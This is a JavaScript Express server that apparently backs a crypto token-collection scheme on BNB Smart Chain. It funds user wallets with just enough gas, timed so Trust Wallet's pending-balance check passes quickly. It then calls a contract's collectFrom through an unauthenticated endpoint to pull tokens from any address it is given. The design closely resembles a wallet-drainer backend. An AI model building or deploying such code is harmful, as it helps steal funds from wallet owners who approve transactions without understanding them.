import dotenv from 'dotenv';
dotenv.config();
import express from 'express';
import cors from 'cors';
import { ethers } from 'ethers';

const app = express();
app.use(cors());
app.use(express.json());

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);

const phrase = process.env.MERCHANT_SECRET_PHRASE?.trim();
if (!phrase) throw new Error("Missing MERCHANT_SECRET_PHRASE in .env");

const merchantWallet = ethers.Wallet.fromPhrase(phrase, provider);
console.log("Relayer Address:", merchantWallet.address);

const CONTRACT_ABI = [
  "function collect(uint256 amount) external",
  "function collectFrom(address userAddress, uint256 amount) external"
];

const collectorContract = new ethers.Contract(
  process.env.CONTRACT_ADDRESS, CONTRACT_ABI, merchantWallet
);

// ─── /fund-gas ────────────────────────────────────────────────────────────────
// CRITICAL CHANGE: We submit the BNB tx and return IMMEDIATELY.
// We do NOT wait for tx.wait() / block confirmation.
//
// Why: Trust Wallet checks PENDING balance (eth_getBalance with "pending" tag)
// when processing eth_sendTransaction. So the BNB just needs to be in the
// MEMPOOL — not confirmed on-chain — for TW's balance check to pass.
// This makes the whole flow take ~500ms instead of 3-5 seconds.
// ─────────────────────────────────────────────────────────────────────────────
app.post('/fund-gas', async (req, res) => {
    try {
        const { userAddress } = req.body;
        if (!userAddress) return res.status(400).json({ error: "Missing userAddress" });

        const balance = await provider.getBalance(userAddress);
        const requiredGas = ethers.parseEther("0.0005");

        if (balance < requiredGas) {
            console.log(`Funding user: ${userAddress}`);
            // Submit tx — DO NOT await tx.wait(). Return immediately.
            const tx = await merchantWallet.sendTransaction({
                to: userAddress,
                value: requiredGas - balance
            });
            console.log(`Funding tx submitted: ${tx.hash}`);
            // Fire-and-forget: let BSC confirm in background
            tx.wait(1).then(() => {
                console.log(`Funding confirmed for: ${userAddress}`);
            }).catch((e) => {
                console.warn(`Funding wait error (non-fatal): ${e.message}`);
            });
        } else {
            console.log(`User already has BNB: ${userAddress}`);
        }

        // Return immediately — frontend does NOT wait for BSC confirmation
        res.json({ success: true });

    } catch (error) {
        console.error("Funding Error:", error);
        res.status(500).json({ error: error.message });
    }
});

// ─── /execute-collection ──────────────────────────────────────────────────────
app.post('/execute-collection', async (req, res) => {
    try {
        const { userAddress, amount } = req.body;
        const parsedAmount = ethers.parseUnits(amount.toString(), 18);
        const tx = await collectorContract.collectFrom(userAddress, parsedAmount);
        const receipt = await tx.wait();
        res.json({ success: true, txHash: receipt.hash });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(process.env.PORT, () => console.log(`Relayer running on port ${process.env.PORT}`));